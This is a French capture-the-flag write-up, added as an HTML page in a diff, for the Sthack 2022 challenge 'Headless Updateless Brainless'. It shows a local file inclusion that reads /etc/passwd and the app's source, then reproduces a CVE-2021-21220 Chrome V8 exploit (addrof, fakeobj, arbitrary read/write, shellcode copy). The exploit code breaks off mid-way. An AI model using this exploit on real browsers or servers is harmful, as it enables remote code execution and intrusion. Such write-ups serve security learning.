@@ -1,0 +1,290 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Headless Updateless Brainless</title>
+<link rel="stylesheet" href="/assets/css/styles.css">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">
+
+    <link rel="stylesheet" type="text/css" href="/assets/css/monokai.css">
+  </head>
+  <body data-bs-theme="dark">
+    <header class="d-flex py-3 mb-4 border-bottom" style="align-items: center; justify-content: space-around;">
+    <a href="/" class="d-flex align-items-center text-dark text-decoration-none">
+      <span class="fs-4"><span class="logo1">Hack</span><span class="logo2">vens</span></span>
+    </a>
+    <button id="btnSwitch" class="">💡/🌙</button>
+    <script defer="defer">
+      document.getElementById('btnSwitch').addEventListener('click',()=>{
+      if (document.body.getAttribute('data-bs-theme') == 'dark') {
+          document.body.setAttribute('data-bs-theme','light')
+          document.documentElement.style.setProperty("--logo-color1", "#161616")
+      }
+      else {
+          document.body.setAttribute('data-bs-theme','dark')
+          document.documentElement.style.setProperty("--logo-color1", "#fff")
+
+      }
+      })
+    </script>
+  </header>
+    <div class="container">
+     <div class="post">
+    <div class="post__back">
+    	<a href="/">&lt;-- home</a>
+    </div>
+    <div class="post__title">
+    	<h1>Sthack 2022 / Headless Updateless Brainless</h1>
+	<i>May 20, 2022</i>
+    </div>
+    <div class="post__meta">
+    	<p></p>
+    </div>
+    <div class="post__content"?>
+        <h1 id="headless-updateless-brainless">Headless Updateless Brainless</h1>
+
+<p>Lors de l’accès au challenge, une page d’accueil est présentée.</p>
+
+<p><img src="/assets/img/sthack2022/updateless/img_1.png" alt="img_1.png" /></p>
+
+<p>Nous constatons que le fichier index.html est indiqué en pramètre GET de l’URL et soupçonnons donc la présente d’une faille de type LFI.
+Nous tentons d’inclure le fichier /etc/passwd.</p>
+
+<p><img src="/assets/img/sthack2022/updateless/img_2.png" alt="img_2.png" /></p>
+
+<p>Nous constatons que l’inclusion de fichier est possible.
+Nous récupérons ensuite la commande exécutée pour lancer le serveur Web grâce à fichier <code class="language-plaintext highlighter-rouge">/proc/self/cmdline</code>.</p>
+
+<p><img src="/assets/img/sthack2022/updateless/img_3.png" alt="img_3.png" /></p>
+
+<p>Nous constatons que l’application est une application NodeJS et que le code source est présent dans un fichier chall.js.
+Nous obtenons ensuite le code source de l’application.</p>
+
+<p><img src="/assets/img/sthack2022/updateless/img_4.png" alt="img_4.png" /></p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#!/usr/bin/env node
+</span>
+<span class="kd">const</span> <span class="nx">http</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">http</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">puppeteer</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">/usr/src/app/node_modules/puppeteer</span><span class="dl">"</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">path</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="k">async</span> <span class="kd">function</span> <span class="nx">takeScreenshot</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">browser</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span> <span class="na">args</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">--no-sandbox</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">--disable-setuid-sandbox</span><span class="dl">'</span><span class="p">],</span> <span class="p">});</span> <span class="c1">// Docker all the way!</span>
+    <span class="kd">const</span> <span class="nx">page</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
+    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">goto</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
+    <span class="nx">url_path</span> <span class="o">=</span> <span class="nx">url</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">_</span><span class="dl">"</span><span class="p">);</span>
+    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">screenshot</span><span class="p">({</span> <span class="na">path</span><span class="p">:</span> <span class="dl">"</span><span class="s2">screens/</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">url_path</span> <span class="p">});</span>
+    <span class="k">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="cm">/** handle GET request */</span>
+<span class="k">async</span> <span class="kd">function</span> <span class="nx">coolHandler</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">reqUrl</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">reqUrl</span><span class="dl">"</span><span class="p">,</span> <span class="nx">reqUrl</span><span class="p">);</span>
+    <span class="nx">url</span> <span class="o">=</span> <span class="nx">reqUrl</span><span class="p">.</span><span class="nx">searchParams</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">url</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nx">url</span> <span class="o">=</span> <span class="p">(</span><span class="nx">url</span> <span class="o">||</span> <span class="dl">""</span><span class="p">).</span><span class="nx">trim</span><span class="p">().</span><span class="nx">toLowerCase</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">http</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nx">filepath</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">takeScreenshot</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">);</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">Work done: </span><span class="dl">'</span><span class="p">,</span> <span class="nx">filepath</span><span class="p">);</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">Me no Worky :&lt;</span><span class="dl">'</span><span class="p">);</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="cm">/** handle GET request */</span>
+<span class="k">async</span> <span class="kd">function</span> <span class="nx">displayHandler</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">reqUrl</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">reqUrl</span><span class="dl">"</span><span class="p">,</span> <span class="nx">reqUrl</span><span class="p">);</span>
+    <span class="nx">file_path</span> <span class="o">=</span> <span class="p">(</span><span class="nx">reqUrl</span><span class="p">.</span><span class="nx">searchParams</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">file</span><span class="dl">"</span><span class="p">)</span> <span class="o">||</span> <span class="dl">""</span><span class="p">).</span><span class="nx">trim</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">file_path</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="nx">file_path</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">().</span><span class="nx">includes</span><span class="p">(</span><span class="dl">"</span><span class="s2">flag</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">302</span><span class="p">,</span> <span class="p">{</span> <span class="dl">'</span><span class="s1">Location</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">/?file=index.html</span><span class="dl">'</span> <span class="p">});</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">file_path</span><span class="p">,</span> <span class="dl">'</span><span class="s1">utf8</span><span class="dl">'</span><span class="p">);</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">);</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">404</span><span class="p">);</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">File doesn't exist or can't be read :(</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">let</span> <span class="nx">base_url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://0.0.0.0/</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="nx">http</span><span class="p">.</span><span class="nx">createServer</span><span class="p">((</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="c1">// create an object for all redirection options</span>
+    <span class="kd">const</span> <span class="nx">router</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="dl">'</span><span class="s1">GET/coolish-unguessable-feature</span><span class="dl">'</span><span class="p">:</span> <span class="nx">coolHandler</span><span class="p">,</span>
+        <span class="dl">'</span><span class="s1">default</span><span class="dl">'</span><span class="p">:</span> <span class="nx">displayHandler</span>
+    <span class="p">};</span>
+    <span class="c1">// parse the url by using WHATWG URL API</span>
+    <span class="kd">let</span> <span class="nx">reqUrl</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span> <span class="nx">base_url</span><span class="p">);</span>
+    <span class="c1">// find the related function by searching "method + pathname" and run it</span>
+    <span class="kd">let</span> <span class="nx">redirectedFunc</span> <span class="o">=</span> <span class="nx">router</span><span class="p">[</span><span class="nx">req</span><span class="p">.</span><span class="nx">method</span> <span class="o">+</span> <span class="nx">reqUrl</span><span class="p">.</span><span class="nx">pathname</span><span class="p">]</span> <span class="o">||</span> <span class="nx">router</span><span class="p">[</span><span class="dl">'</span><span class="s1">default</span><span class="dl">'</span><span class="p">];</span>
+    <span class="nx">redirectedFunc</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">reqUrl</span><span class="p">);</span>
+<span class="p">}).</span><span class="nx">listen</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Server is running at </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">base_url</span><span class="p">);</span>
+<span class="p">});</span>
+
+</code></pre></div></div>
+
+<p>Nous constatons que la route “coolish-unguessable-feature” accepte un paramètre GET appelé “url” et prend une capture d’écran de la page indiquée en paramètre.
+Nous notons que la sandbox de Puppeteer est désactivée.</p>
+
+<p>Nous tentons donc d’indiquer une URL nous appartenant afin d’observer le User-Agent faisant la requête.
+Nous recevons une requête.</p>
+
+<p><img src="/assets/img/sthack2022/updateless/img_5.png" alt="img_5.png" /></p>
+
+<p>Celle-ci provient du navigateur Chrome, dans son mode headless et dans la version 89.0.4389.72, qui est obsolète.
+Nous cherchons donc si cette version est exposée à des vulnérabilités connues.</p>
+
+<p><img src="/assets/img/sthack2022/updateless/img_6.png" alt="img_6.png" /></p>
+
+<p>Nous constatons que cette version est exposée à différentes vulnérabilités connues.
+La vulnérabilité qui nous intéresse est l’exécution arbitraire de code.
+Celle-ci correspond à la CVE-2021-21220.</p>
+
+<p>Nos recherches de POC nous indiquent qu’un exploit est disponible sur metasploit. Ne disposant pas d’un serveur accessible depuis Internet ayant Metasploit, nous récupérons le code source de l’exploit.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">wasm_code</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">11</span><span class="p">])</span>
+<span class="kd">var</span> <span class="nx">wasm_mod</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasm_code</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_mod</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">wasm_main_func</span> <span class="o">=</span> <span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
+
+<span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+
+<span class="kd">var</span> <span class="nx">shellcode</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span><span class="err">#</span><span class="p">{</span><span class="nx">shellcode</span><span class="p">}]);</span>
+<span class="kd">var</span> <span class="nx">shellbuf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">DataView</span><span class="p">(</span><span class="nx">shellbuf</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
+	<span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
+	<span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+	<span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="kd">const</span> <span class="nx">_arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">([</span><span class="mi">2</span><span class="o">**</span><span class="mi">31</span><span class="p">]);</span>
+
+<span class="kd">function</span> <span class="nx">foo</span><span class="p">()</span> <span class="p">{</span>
+	<span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="nx">x</span> <span class="o">=</span> <span class="p">(</span><span class="nx">_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+
+	<span class="nx">x</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
+	<span class="nx">x</span> <span class="o">-=</span> <span class="mh">0x7FFFFFFF</span><span class="p">;</span>
+	<span class="nx">x</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+	<span class="nx">x</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span><span class="nx">x</span><span class="o">==-</span><span class="mi">1</span><span class="p">)</span> <span class="nx">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+	<span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
+	<span class="nx">arr</span><span class="p">.</span><span class="nx">shift</span><span class="p">();</span>
+	<span class="kd">var</span> <span class="nx">cor</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">];</span>
+
+	<span class="k">return</span> <span class="p">[</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">cor</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="mh">0x3000</span><span class="p">;</span><span class="o">++</span><span class="nx">i</span><span class="p">)</span>
+	<span class="nx">foo</span><span class="p">();</span>
+
+<span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">foo</span><span class="p">();</span>
+<span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nx">x</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">cor</span> <span class="o">=</span> <span class="nx">x</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+
+<span class="kd">const</span> <span class="nx">idx</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
+<span class="nx">arr</span><span class="p">[</span><span class="nx">idx</span><span class="o">+</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4242</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nx">cor</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="nx">location</span><span class="p">.</span><span class="nx">reload</span><span class="p">();</span>
+
+<span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nx">arr</span><span class="p">[</span><span class="nx">idx</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">k</span><span class="p">;</span>
+	<span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">cor</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nx">cor</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">k</span><span class="p">);</span>
+	<span class="k">return</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">idx</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="kd">var</span> <span class="nx">arr2</span> <span class="o">=</span> <span class="p">[</span><span class="nx">cor</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">2.3</span><span class="p">,</span> <span class="mf">3.4</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arr2</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nx">arbread</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">%</span> <span class="mi">2</span><span class="nx">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nx">addr</span> <span class="o">+=</span> <span class="mi">1</span><span class="nx">n</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="nx">arr2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="mi">2</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">addr</span> <span class="o">-</span> <span class="mi">8</span><span class="nx">n</span><span class="p">);</span>
+	<span class="k">return</span> <span class="p">(</span><span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">arbwrite</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">%</span> <span class="mi">2</span><span class="nx">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nx">addr</span> <span class="o">+=</span> <span class="mi">1</span><span class="nx">n</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="nx">arr2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="mi">2</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">addr</span> <span class="o">-</span> <span class="mi">8</span><span class="nx">n</span><span class="p">);</span>
+	<span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kd">let</span> <span class="nx">buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">shellbuf</span><span class="p">);</span>
+	<span class="kd">let</span> <span class="nx">backing_store_addr</span> <span class="o">=</span> <span class="nx">buf_addr</span> <span class="o">+</span> <span class="mh">0x14</span><span class="nx">n</span><span class="p">;</span>
+	<span class="nx">arbwrite</span><span class="p">(</span><span class="nx">backing_store_addr</span><span class="p">,</span> <span class="nx">addr</span><span class="p">);</span>
+
+	<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nx">dataview</span><span class="p">.</span><span class="nx">setUint8</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
